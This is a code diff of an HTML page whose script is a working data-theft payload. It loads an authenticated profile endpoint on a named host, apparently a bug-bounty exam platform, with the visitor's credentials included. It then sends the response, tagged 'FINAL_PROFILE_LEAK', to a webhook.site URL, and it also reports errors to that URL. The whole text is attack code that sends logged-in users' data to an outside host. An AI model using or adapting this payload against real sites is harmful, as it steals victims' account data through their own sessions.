@@ -3,22 +3,24 @@
 <body>
     <script>
         const webh = "https://webhook.site/1abdbc1b-75fa-4240-8ae0-e2ffb37b707e";
-        const target = "https://api-bugbounty-exam.hashacademy.co/api/auth/profile";
+        const base = "https://api-bugbounty-exam.hashacademy.co";
+        
+        // This is the winner endpoint you found
+        const target = base + "/api/auth/profile";
 
-        fetch(target, { credentials: "include" })
-            .then(response => response.text())
+        fetch(target, { credentials: 'include' })
+            .then(r => r.text())
             .then(data => {
-                // Sending the full profile back to your webhook
                 fetch(webh, {
                     method: "POST",
-                    body: JSON.stringify({
-                        type: "ADMIN_PROFILE_SUCCESS",
-                        content: data
+                    body: JSON.stringify({ 
+                        type: "FINAL_PROFILE_LEAK", 
+                        content: data 
                     })
                 });
             })
             .catch(err => {
-                new Image().src = webh + "/?err=" + btoa(err.message);
+                fetch(webh, { method: "POST", body: "Error: " + err.message });
             });
     </script>
 </body>
